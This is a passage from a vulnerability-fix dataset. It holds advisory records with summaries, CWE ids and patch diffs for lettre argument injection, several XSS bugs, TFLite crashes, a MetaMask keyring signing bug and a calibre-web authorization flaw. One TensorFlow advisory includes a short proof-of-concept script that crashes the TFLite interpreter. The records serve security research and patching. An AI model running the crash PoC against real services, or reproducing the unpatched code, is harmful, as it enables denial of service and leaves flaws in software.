{\\n+      if (err) {\\n+        return cb(err);\\n+      }\\n+      \/\/ TODO: Error if session isn't available here.\\n+      if (!req.session) {\\n+        req.session = {};\\n+      }\\n+      if (!req.session[self._key]) {\\n+        req.session[self._key] = {};\\n+      }\\n+      req.session[self._key].user = obj;\\n+      cb();\\n+    });\\n   });\\n }\\n \\n SessionManager.prototype.logOut = function(req, cb) {\\n+  console.log('SM: logOut');\\n+  \\n   if (req.session && req.session[this._key]) {\\n     delete req.session[this._key].user;\\n   }\"}}","message_norm":"regenerate session on login.","language":"en","entities":"[('login', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/sessionmanager.js'])","num_files":1.0},{"index":3090,"vuln_id":"GHSA-vc2p-r46x-m3vx","cwe_id":"{'CWE-77'}","score":5.3,"chain":"{'https:\/\/github.com\/lettre\/lettre\/pull\/508\/commits\/bbe7cc5381c5380b54fb8bbb4f77a3725917ff0b'}","dataset":"osv","summary":"Argument injection in lettre ### Impact\n\nAffected versions of lettre allowed argument injection to the sendmail command. It was possible, using forged to addresses, to pass arbitrary arguments to the sendmail executable.\n\nDepending on the implementation (original sendmail, postfix, exim, etc.) it could be possible in some cases to write email data into abritrary files (using sendmail's logging features).\n\n*NOTE*: This vulnerability only affects the sendmail transport. Others, including smtp, are not affected.\n\n### Fix\n\nThe flaw is corrected by modifying the executed command to stop parsing arguments before passing the destination addresses.\n\n### References\n\n* [RUSTSEC-2020-0069](https:\/\/rustsec.org\/advisories\/RUSTSEC-2020-0069.html)\n* [CVE-2020-28247](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2020-28247)","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/lettre\/lettre","commit_href":"https:\/\/github.com\/lettre\/lettre\/pull\/508\/commits\/bbe7cc5381c5380b54fb8bbb4f77a3725917ff0b","commit_sha":"bbe7cc5381c5380b54fb8bbb4f77a3725917ff0b","patch":"SINGLE","chain_ord":"['bbe7cc5381c5380b54fb8bbb4f77a3725917ff0b']","before_first_fix_commit":"{'b187885e70af400d50e3200390306b9bd2109675'}","last_fix_commit":"bbe7cc5381c5380b54fb8bbb4f77a3725917ff0b","chain_ord_pos":1.0,"commit_datetime":"11\/11\/2020, 15:43:09","message":"fix(transport-sendmail): Stop argument parsing before destination addresses","author":"Alexis Mousset","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'src\/transport\/sendmail\/mod.rs': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/lettre\/lettre\/raw\/bbe7cc5381c5380b54fb8bbb4f77a3725917ff0b\/src%2Ftransport%2Fsendmail%2Fmod.rs', 'patch': '@@ -120,6 +120,7 @@ impl SendmailTransport {\\n         c.arg(\"-i\")\\n             .arg(\"-f\")\\n             .arg(envelope.from().map(|f| f.as_ref()).unwrap_or(\"\\\\\"\\\\\"\"))\\n+            .arg(\"--\")\\n             .args(envelope.to())\\n             .stdin(Stdio::piped())\\n             .stdout(Stdio::piped());\\n@@ -135,6 +136,7 @@ impl SendmailTransport {\\n         c.arg(\"-i\")\\n             .arg(\"-f\")\\n             .arg(envelope.from().map(|f| f.as_ref()).unwrap_or(\"\\\\\"\\\\\"\"))\\n+            .arg(\"--\")\\n             .args(envelope.to())\\n             .stdin(Stdio::piped())\\n             .stdout(Stdio::piped());\\n@@ -150,6 +152,7 @@ impl SendmailTransport {\\n         c.arg(\"-i\")\\n             .arg(\"-f\")\\n             .arg(envelope.from().map(|f| f.as_ref()).unwrap_or(\"\\\\\"\\\\\"\"))\\n+            .arg(\"--\")\\n             .args(envelope.to())\\n             .stdin(Stdio::piped())\\n             .stdout(Stdio::piped());'}}","message_norm":"fix(transport-sendmail): stop argument parsing before destination addresses","language":"fr","entities":"[('fix(transport', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/transport\/sendmail\/mod.rs'])","num_files":1.0},{"index":3091,"vuln_id":"GHSA-vc3x-gx6c-g99f","cwe_id":"{'CWE-190'}","score":7.5,"chain":"{'https:\/\/github.com\/Bytom\/bytom\/commit\/1ac3c8ac4f2b1e1df9675228290bda6b9586ba42'}","dataset":"osv","summary":"Denial of Service in Bytom In the client in Bytom before 1.0.6, checkTopicRegister in p2p\/discover\/net.go does not prevent negative idx values, leading to a crash.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/Bytom\/bytom","commit_href":"https:\/\/github.com\/Bytom\/bytom\/commit\/1ac3c8ac4f2b1e1df9675228290bda6b9586ba42","commit_sha":"1ac3c8ac4f2b1e1df9675228290bda6b9586ba42","patch":"SINGLE","chain_ord":"['1ac3c8ac4f2b1e1df9675228290bda6b9586ba42']","before_first_fix_commit":"{'69b3d4c7cf41c6628efb34ed79ad35e9e22bbf82'}","last_fix_commit":"1ac3c8ac4f2b1e1df9675228290bda6b9586ba42","chain_ord_pos":1.0,"commit_datetime":"08\/31\/2018, 05:48:40","message":"p2p\/discv5: fix idx can be negative after uint convert to int(can cause crash) (#1307)","author":"yahtoo","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'p2p\/discover\/net.go': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Bytom\/bytom\/raw\/1ac3c8ac4f2b1e1df9675228290bda6b9586ba42\/p2p%2Fdiscover%2Fnet.go', 'patch': '@@ -1221,7 +1221,7 @@ func (net *Network) checkTopicRegister(data *topicRegister) (*pong, error) {\\n \\tif hash != pongpkt.data.(*pong).TopicHash {\\n \\t\\treturn nil, errors.New(\"topic hash mismatch\")\\n \\t}\\n-\\tif data.Idx < 0 || int(data.Idx) >= len(data.Topics) {\\n+\\tif int(data.Idx) < 0 || int(data.Idx) >= len(data.Topics) {\\n \\t\\treturn nil, errors.New(\"topic index out of range\")\\n \\t}\\n \\treturn pongpkt.data.(*pong), nil'}}","message_norm":"p2p\/discv5: fix idx can be negative after uint convert to int(can cause crash) (#1307)","language":"en","entities":"[('fix', 'ACTION', ''), ('#1307', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['p2p\/discover\/net.go'])","num_files":1.0},{"index":3092,"vuln_id":"GHSA-vc5r-xfc4-4x22","cwe_id":"{'CWE-79'}","score":4.8,"chain":"{'https:\/\/github.com\/pimcore\/data-hub\/commit\/15d5b57af2466eebd3bbc531ead5dafa35d0a36e'}","dataset":"osv","summary":"Cross-site Scripting in Pimcore Datahub Pimcore Datahub prior to 1.2.4 is vulnerable to stored cross-site scripting. An admin user accessing Datahub triggers the attack, which may result in the user's cookie being stolen.","published_date":"2022-03-25","chain_len":1,"project":"https:\/\/github.com\/pimcore\/data-hub","commit_href":"https:\/\/github.com\/pimcore\/data-hub\/commit\/15d5b57af2466eebd3bbc531ead5dafa35d0a36e","commit_sha":"15d5b57af2466eebd3bbc531ead5dafa35d0a36e","patch":"SINGLE","chain_ord":"['15d5b57af2466eebd3bbc531ead5dafa35d0a36e']","before_first_fix_commit":"{'1561fa5cda0d1a79139efbd2113e42a63d5602e4'}","last_fix_commit":"15d5b57af2466eebd3bbc531ead5dafa35d0a36e","chain_ord_pos":1.0,"commit_datetime":"03\/16\/2022, 13:24:41","message":"follow up to https:\/\/github.com\/pimcore\/data-hub\/pull\/462","author":"dpahuja","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/Controller\/ConfigController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/data-hub\/raw\/15d5b57af2466eebd3bbc531ead5dafa35d0a36e\/src%2FController%2FConfigController.php', 'patch': \"@@ -50,7 +50,7 @@ private function buildItem($configuration): array\\n \\n         return [\\n             'id' => $name,\\n-            'text' => $name,\\n+            'text' => htmlspecialchars($name),\\n             'type' => 'config',\\n             'iconCls' => 'plugin_pimcore_datahub_icon_' . $type,\\n             'expandable' => false,\"}}","message_norm":"follow up to https:\/\/github.com\/pimcore\/data-hub\/pull\/462","language":"en","entities":"[('https:\/\/github.com\/pimcore\/data-hub\/pull\/462', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Controller\/ConfigController.php'])","num_files":1.0},{"index":3095,"vuln_id":"GHSA-vcfc-9wcp-j623","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/ServiceStack\/ServiceStack\/commit\/a0e0d7de20f5d1712f1793f925496def4383c610'}","dataset":"osv","summary":"Cross site scripting attack in ServiceStack Framework ServiceStack ServiceStack Framework 4.5.14 is affected by: Cross Site Scripting (XSS). The impact is: JavaScrpit is reflected in the server response, hence executed by the browser. The component is: the query used in the GET request is prone. The attack vector is: Since there is no server-side validation and If Browser encoding is bypassed, the victim is affected when opening a crafted URL. The fixed version is: 5.2.0.","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/ServiceStack\/ServiceStack","commit_href":"https:\/\/github.com\/ServiceStack\/ServiceStack\/commit\/a0e0d7de20f5d1712f1793f925496def4383c610","commit_sha":"a0e0d7de20f5d1712f1793f925496def4383c610","patch":"SINGLE","chain_ord":"['a0e0d7de20f5d1712f1793f925496def4383c610']","before_first_fix_commit":"{'2c6fbe4554014ead15b7b188bb748b655b30807c'}","last_fix_commit":"a0e0d7de20f5d1712f1793f925496def4383c610","chain_ord_pos":1.0,"commit_datetime":"08\/17\/2018, 15:05:59","message":"HtmlEncode Raw URL in HtmlFormat snapshot","author":"Demis Bellot","comments":null,"stats":"{'additions': 3, 'deletions': 2, 'total': 5}","files":"{'src\/ServiceStack\/Formats\/HtmlFormat.cs': {'additions': 3, 'deletions': 2, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ServiceStack\/ServiceStack\/raw\/a0e0d7de20f5d1712f1793f925496def4383c610\/src%2FServiceStack%2FFormats%2FHtmlFormat.cs', 'patch': '@@ -90,12 +90,13 @@ public async Task SerializeToStreamAsync(IRequest req, object response, Stream o\\n             {\\n                 \/\/ Serialize then escape any potential script tags to avoid XSS when displaying as HTML\\n                 var json = JsonDataContractSerializer.Instance.SerializeToString(dto) ?? \"null\";\\n-                json = json.Replace(\"<\", \"&lt;\").Replace(\">\", \"&gt;\");\\n+                json = json.HtmlEncode();\\n \\n                 var url = req.ResolveAbsoluteUrl()\\n                     .Replace(\"format=html\", \"\")\\n                     .Replace(\"format=shtm\", \"\")\\n-                    .TrimEnd(\\'?\\', \\'&\\');\\n+                    .TrimEnd(\\'?\\', \\'&\\')\\n+                    .HtmlEncode();\\n \\n                 url += url.Contains(\"?\") ? \"&\" : \"?\";'}}","message_norm":"htmlencode raw url in htmlformat snapshot","language":"en","entities":"[('htmlencode', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/ServiceStack\/Formats\/HtmlFormat.cs'])","num_files":1.0},{"index":3097,"vuln_id":"GHSA-vcjj-9vg7-vf68","cwe_id":"{'CWE-476'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/15691e456c7dc9bd6be203b09765b063bf4a380c'}","dataset":"osv","summary":"Null pointer dereference in TFLite ### Impact\nAn attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:\n\n```python\nimport tensorflow as tf\n\nmodel = tf.keras.models.Sequential()\nmodel.add(tf.keras.Input(shape=(1, 2, 3)))\nmodel.add(tf.keras.layers.Dense(0, activation='relu'))\n\nconverter = tf.lite.TFLiteConverter.from_keras_model(model)\ntflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninterpreter.invoke()\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/lite\/kernels\/internal\/optimized\/optimized_ops.h#L268-L285) unconditionally dereferences a pointer.\n\n```cc\n  if (y4 > 1) {\n    \/\/ ...\n  } else {\n    for (int i0 = 0; i0 < y0; ++i0) {\n      const T* input2_data_ptr = nullptr;\n      for (int i1 = 0; i1 < y1; ++i1) {\n        input2_data_ptr = input2_data_reset;\n        for (int i2 = 0; i2 < y2; ++i2) {\n          scalar_broadcast_f(y3, params, *input1_data_ptr, input2_data_ptr,\n                             output_data_ptr);\n        }\n      }\n    }\n  }\n```\n\n### Patches\nWe have patched the issue in GitHub commit [15691e456c7dc9bd6be203b09765b063bf4a380c](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/15691e456c7dc9bd6be203b09765b063bf4a380c).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/15691e456c7dc9bd6be203b09765b063bf4a380c","commit_sha":"15691e456c7dc9bd6be203b09765b063bf4a380c","patch":"SINGLE","chain_ord":"['15691e456c7dc9bd6be203b09765b063bf4a380c']","before_first_fix_commit":"{'c107c1a6cee9afe5f718a48b70ffaa44bece42a2'}","last_fix_commit":"15691e456c7dc9bd6be203b09765b063bf4a380c","chain_ord_pos":1.0,"commit_datetime":"07\/28\/2021, 01:40:39","message":"Prevent dereferencing of null pointers in TFLite's `add.cc`.\n\nPiperOrigin-RevId: 387244946\nChange-Id: I56094233327fbd8439b92e1dbb1262176e00eeb9","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'tensorflow\/lite\/kernels\/internal\/optimized\/optimized_ops.h': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/15691e456c7dc9bd6be203b09765b063bf4a380c\/tensorflow%2Flite%2Fkernels%2Finternal%2Foptimized%2Foptimized_ops.h', 'patch': '@@ -265,7 +265,7 @@ inline void BinaryBroadcastFiveFold(const ArithmeticParams& unswitched_params,\\n       \/\/ We have broadcast y2*y3*y4 of input2 data y1 times, and now move on.\\n       input2_data_reset = input2_data_ptr;\\n     }\\n-  } else {\\n+  } else if (input1_data_ptr != nullptr) {\\n     \/\/ Special case of y4 == 1, in which the innermost loop is a single\\n     \/\/ element and can be combined with the next (y3) as an inner broadcast.\\n     \/\/'}}","message_norm":"prevent dereferencing of null pointers in tflite's `add.cc`.\n\npiperorigin-revid: 387244946\nchange-id: i56094233327fbd8439b92e1dbb1262176e00eeb9","language":"en","entities":"[('prevent', 'ACTION', ''), ('387244946', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/internal\/optimized\/optimized_ops.h'])","num_files":1.0},{"index":3107,"vuln_id":"GHSA-vfr4-x8j2-3rf9","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/801c1c6be5324219689c98e1bd3e0ca365ee834d'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of `TransposeConv` ### Impact\nThe optimized implementation of the `TransposeConv` TFLite operator is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7\/tensorflow\/lite\/kernels\/internal\/optimized\/optimized_ops.h#L5221-L5222):\n\n```cc \nint height_col = (height + pad_t + pad_b - filter_h) \/ stride_h + 1;\nint width_col = (width + pad_l + pad_r - filter_w) \/ stride_w + 1;\n```\n\nAn attacker can craft a model such that `stride_{h,w}` values are 0. Code calling this function must validate these arguments.\n\n### Patches\nWe have patched the issue in GitHub commit [801c1c6be5324219689c98e1bd3e0ca365ee834d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/801c1c6be5324219689c98e1bd3e0ca365ee834d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/801c1c6be5324219689c98e1bd3e0ca365ee834d","commit_sha":"801c1c6be5324219689c98e1bd3e0ca365ee834d","patch":"SINGLE","chain_ord":"['801c1c6be5324219689c98e1bd3e0ca365ee834d']","before_first_fix_commit":"{'8e45822aa0b9f5df4b4c64f221e64dc930a70a9d'}","last_fix_commit":"801c1c6be5324219689c98e1bd3e0ca365ee834d","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 00:46:25","message":"Fix another division by 0 in TFLite\n\nPiperOrigin-RevId: 370800181\nChange-Id: I924809166a6131f5075e6d45c455106538d755f9","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/lite\/kernels\/transpose_conv.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/801c1c6be5324219689c98e1bd3e0ca365ee834d\/tensorflow%2Flite%2Fkernels%2Ftranspose_conv.cc', 'patch': '@@ -591,6 +591,10 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   const auto* params =\\n       reinterpret_cast<TfLiteTransposeConvParams*>(node->builtin_data);\\n \\n+  \/\/ Prevent divisions by 0\\n+  TF_LITE_ENSURE(context, params->stride_height > 0);\\n+  TF_LITE_ENSURE(context, params->stride_width > 0);\\n+\\n   \/\/ Resize any deferred dynamic tensors\\n   if (IsDynamicTensor(output)) {\\n     TF_LITE_ENSURE_OK(context, ResizeTensor(context, output_shape, output));'}}","message_norm":"fix another division by 0 in tflite\n\npiperorigin-revid: 370800181\nchange-id: i924809166a6131f5075e6d45c455106538d755f9","language":"en","entities":"[('fix', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370800181', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/transpose_conv.cc'])","num_files":1.0},{"index":3109,"vuln_id":"GHSA-vfrc-ggmc-5jwv","cwe_id":"{'CWE-79'}","score":8.8,"chain":"{'https:\/\/github.com\/django-helpdesk\/django-helpdesk\/commit\/04483bdac3b5196737516398b5ce0383875a5c60'}","dataset":"osv","summary":"Cross-site Scripting in django-helpdesk django-helpdesk is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","published_date":"2021-11-23","chain_len":1,"project":"https:\/\/github.com\/django-helpdesk\/django-helpdesk","commit_href":"https:\/\/github.com\/django-helpdesk\/django-helpdesk\/commit\/04483bdac3b5196737516398b5ce0383875a5c60","commit_sha":"04483bdac3b5196737516398b5ce0383875a5c60","patch":"SINGLE","chain_ord":"['04483bdac3b5196737516398b5ce0383875a5c60']","before_first_fix_commit":"{'2c7065e0c4296e0c692fb4a7ee19c7357583af30'}","last_fix_commit":"04483bdac3b5196737516398b5ce0383875a5c60","chain_ord_pos":1.0,"commit_datetime":"11\/18\/2021, 03:42:02","message":"Add `att.full_clean()` before saving\n\nFix issue https:\/\/github.com\/django-helpdesk\/django-helpdesk\/issues\/983\r\nAlso, fix bug stored XSS disclosure: https:\/\/huntr.dev\/bounties\/4d7a5fdd-b2de-467a-ade0-3f2fb386638e\/","author":"lethanhphuc","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'helpdesk\/lib.py': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/django-helpdesk\/django-helpdesk\/raw\/04483bdac3b5196737516398b5ce0383875a5c60\/helpdesk%2Flib.py', 'patch': \"@@ -145,6 +145,7 @@ def process_attachments(followup, attached_files):\\n                 'application\/octet-stream',\\n                 size=attached.size,\\n             )\\n+            att.full_clean()\\n             att.save()\\n \\n             if attached.size < max_email_attachment_size:\"}}","message_norm":"add `att.full_clean()` before saving\n\nfix issue https:\/\/github.com\/django-helpdesk\/django-helpdesk\/issues\/983\r\nalso, fix bug stored xss disclosure: https:\/\/huntr.dev\/bounties\/4d7a5fdd-b2de-467a-ade0-3f2fb386638e\/","language":"en","entities":"[('add', 'ACTION', ''), ('issue', 'FLAW', ''), ('https:\/\/github.com\/django-helpdesk\/django-helpdesk\/issues\/983', 'URL', ''), ('fix', 'ACTION', ''), ('bug', 'FLAW', ''), ('xss', 'SECWORD', ''), ('disclosure', 'SECWORD', ''), ('https:\/\/huntr.dev\/bounties\/4d7a5fdd-b2de-467a-ade0-3f2fb386638e\/', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['helpdesk\/lib.py'])","num_files":1.0},{"index":3112,"vuln_id":"GHSA-vg44-fw64-cpjx","cwe_id":"{'CWE-287'}","score":7.5,"chain":"{'https:\/\/github.com\/MetaMask\/eth-ledger-bridge-keyring\/commit\/f32e529d13a53e55f558d903534d631846dc26ce'}","dataset":"osv","summary":"Incorrect Account Used for Signing ### Impact\n\nAnybody using this library to sign with a BIP44 account other than the first account may be affected. If a user is signing with the first account (i.e. the account at index `0`), or with the legacy MEW\/MyCrypto HD path, they are not affected.\n\nThe vulnerability impacts cases where the user signs a personal message or transaction without first adding the account. This includes cases where the user has already added the account in a previous session (i.e. they added the account, reset the application, then signed something). The serialization\/deserialization process does restore a previously added account, but it doesn&#39;t restore the index instructing the keyring to use that account for signing. As a result, after serializing then deserializing the keyring state, the account at index `0` is always used for signing even if it isn&#39;t the current account.\n\n### Patches\n\nThis has been patched ([#14](https:\/\/github.com\/MetaMask\/eth-ledger-bridge-keyring\/pull\/14)) in version &gt;=0.2.1 of [`eth-ledger-bridge-keyring`](https:\/\/www.npmjs.com\/package\/eth-ledger-bridge-keyring), and in version &gt;=0.2.2 of [`@metamask\/eth-ledger-bridge-keyring`](https:\/\/www.npmjs.com\/package\/@metamask\/eth-ledger-bridge-keyring). Users are encouraged to migrate to the new package name.\n\n### Workarounds\n\nTo work around this problem without updating, you should remove then re-add the account before use. As long as the account was added during the lifetime of that process, signing with that account should work correctly.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [MetaMask\/eth-ledger-bridge-keyring on GitHub](https:\/\/github.com\/MetaMask\/eth-ledger-bridge-keyring)\n* Email the MetaMask team at [hello@metamask.io](mailto:hello@metamask.io)","published_date":"2020-03-24","chain_len":1,"project":"https:\/\/github.com\/MetaMask\/eth-ledger-bridge-keyring","commit_href":"https:\/\/github.com\/MetaMask\/eth-ledger-bridge-keyring\/commit\/f32e529d13a53e55f558d903534d631846dc26ce","commit_sha":"f32e529d13a53e55f558d903534d631846dc26ce","patch":"SINGLE","chain_ord":"['f32e529d13a53e55f558d903534d631846dc26ce']","before_first_fix_commit":"{'25d96289bdffb369a70cbafd70b4ca1f1be47fcc'}","last_fix_commit":"f32e529d13a53e55f558d903534d631846dc26ce","chain_ord_pos":1.0,"commit_datetime":"03\/02\/2020, 22:58:21","message":"Always sign transactions and messages with the correct account (#14)\n\nThe account used to sign transactions and messages should be the one\r\nthe transaction or message is from. Instead, the last connected account\r\nwas being used to sign any messages or transactions.\r\n\r\nThis was especially problematic considering the last connected account\r\nwas not persisted, meaning that signatures were being performed with\r\nthe wrong account after a reset (unless the last connected account\r\nhappened to be account 0, which was the default).\r\n\r\nA mapping of addresses to indexes as been added to the keyring state,\r\nand this mapping has been persisted. This should ensure the correct\r\naccount index is used, and thus the correct hd path, each time this\r\nkeyring is used for signing.","author":"Mark Stacey","comments":null,"stats":"{'additions': 15, 'deletions': 2, 'total': 17}","files":"{'index.js': {'additions': 15, 'deletions': 2, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/MetaMask\/eth-ledger-bridge-keyring\/raw\/f32e529d13a53e55f558d903534d631846dc26ce\/index.js', 'patch': \"@@ -18,6 +18,7 @@ const NETWORK_API_URLS = {\\n class LedgerBridgeKeyring extends EventEmitter {\\n   constructor (opts = {}) {\\n     super()\\n+    this.accountIndexes = {}\\n     this.bridgeUrl = null\\n     this.type = type\\n     this.page = 0\\n@@ -36,6 +37,7 @@ class LedgerBridgeKeyring extends EventEmitter {\\n     return Promise.resolve({\\n       hdPath: this.hdPath,\\n       accounts: this.accounts,\\n+      accountIndexes: this.accountIndexes,\\n       bridgeUrl: this.bridgeUrl,\\n       implementFullBIP44: false,\\n     })\\n@@ -45,6 +47,7 @@ class LedgerBridgeKeyring extends EventEmitter {\\n     this.hdPath = opts.hdPath || hdPathString\\n     this.bridgeUrl = opts.bridgeUrl || BRIDGE_URL\\n     this.accounts = opts.accounts || []\\n+    this.accountIndexes = opts.accountIndexes || {}\\n     this.implementFullBIP44 = opts.implementFullBIP44 || false\\n     return Promise.resolve()\\n   }\\n@@ -100,6 +103,7 @@ class LedgerBridgeKeyring extends EventEmitter {\\n             if (this._isBIP44()) {\\n               const path = this._getPathForIndex(i)\\n               address = await this.unlock(path)\\n+              this.accountIndexes[ethUtil.toChecksumAddress(address)] = i\\n             } else {\\n               address = this._addressFromIndex(pathBase, i)\\n             }\\n@@ -136,6 +140,7 @@ class LedgerBridgeKeyring extends EventEmitter {\\n       throw new Error(`Address ${address} not found in this keyring`)\\n     }\\n     this.accounts = this.accounts.filter(a => a.toLowerCase() !== address.toLowerCase())\\n+    delete this.accountIndexes[ethUtil.toChecksumAddress(address)]\\n   }\\n \\n   \/\/ tx is an instance of the ethereumjs-transaction class.\\n@@ -150,7 +155,11 @@ class LedgerBridgeKeyring extends EventEmitter {\\n \\n           let hdPath\\n           if (this._isBIP44()) {\\n-            hdPath = this._getPathForIndex(this.unlockedAccount)\\n+            const checksummedAddress = ethUtil.toChecksumAddress(address)\\n+            if (!this.accountIndexes[checksummedAddress]) {\\n+              reject(new Error(`Ledger: Index for address '${checksummedAddress}' not found`))\\n+            }\\n+            hdPath = this._getPathForIndex(this.accountIndexes[checksummedAddress])\\n           } else {\\n             hdPath = this._toLedgerPath(this._pathFromAddress(address))\\n           }\\n@@ -195,7 +204,11 @@ class LedgerBridgeKeyring extends EventEmitter {\\n         .then(_ => {\\n           let hdPath\\n           if (this._isBIP44()) {\\n-            hdPath = this._getPathForIndex(this.unlockedAccount)\\n+            const checksummedAddress = ethUtil.toChecksumAddress(withAccount)\\n+            if (!this.accountIndexes[checksummedAddress]) {\\n+              reject(new Error(`Ledger: Index for address '${checksummedAddress}' not found`))\\n+            }\\n+            hdPath = this._getPathForIndex(this.accountIndexes[checksummedAddress])\\n           } else {\\n             hdPath = this._toLedgerPath(this._pathFromAddress(withAccount))\\n           }\"}}","message_norm":"always sign transactions and messages with the correct account (#14)\n\nthe account used to sign transactions and messages should be the one\r\nthe transaction or message is from. instead, the last connected account\r\nwas being used to sign any messages or transactions.\r\n\r\nthis was especially problematic considering the last connected account\r\nwas not persisted, meaning that signatures were being performed with\r\nthe wrong account after a reset (unless the last connected account\r\nhappened to be account 0, which was the default).\r\n\r\na mapping of addresses to indexes as been added to the keyring state,\r\nand this mapping has been persisted. this should ensure the correct\r\naccount index is used, and thus the correct hd path, each time this\r\nkeyring is used for signing.","language":"en","entities":"[('#14', 'ISSUE', ''), ('added', 'ACTION', ''), ('keyring', 'SECWORD', ''), ('ensure', 'ACTION', ''), ('keyring', 'SECWORD', ''), ('signing', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":3113,"vuln_id":"GHSA-vgmw-9cww-qq99","cwe_id":"{'CWE-284', 'CWE-863'}","score":6.5,"chain":"{'https:\/\/github.com\/janeczku\/calibre-web\/commit\/0c0313f375bed7b035c8c0482bbb09599e16bfcf'}","dataset":"osv","summary":"Incorrect Authorization in calibreweb calibreweb prior to version 0.6.16 contains an Incorrect Authorization vulnerability.","published_date":"2022-01-31","chain_len":1,"project":"https:\/\/github.com\/janeczku\/calibre-web","commit_href":"https:\/\/github.com\/janeczku\/calibre-web\/commit\/0c0313f375bed7b035c8c0482bbb09599e16bfcf","commit_sha":"0c0313f375bed7b035c8c0482bbb09599e16bfcf","patch":"SINGLE","chain_ord":"['0c0313f375bed7b035c8c0482bbb09599e16bfcf']","before_first_fix_commit":"{'6bf07539788004513c3692c074ebc7ba4ce005e1'}","last_fix_commit":"0c0313f375bed7b035c8c0482bbb09599e16bfcf","chain_ord_pos":1.0,"commit_datetime":"01\/18\/2022, 16:55:10","message":"Prevent creating a public shelf without permission","author":"Ozzie Isaacs","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'cps\/shelf.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/janeczku\/calibre-web\/raw\/0c0313f375bed7b035c8c0482bbb09599e16bfcf\/cps%2Fshelf.py', 'patch': '@@ -248,7 +248,7 @@ def create_edit_shelf(shelf, page_title, page, shelf_id=False):\\n         if not current_user.role_edit_shelfs() and to_save.get(\"is_public\") == \"on\":\\n             flash(_(u\"Sorry you are not allowed to create a public shelf\"), 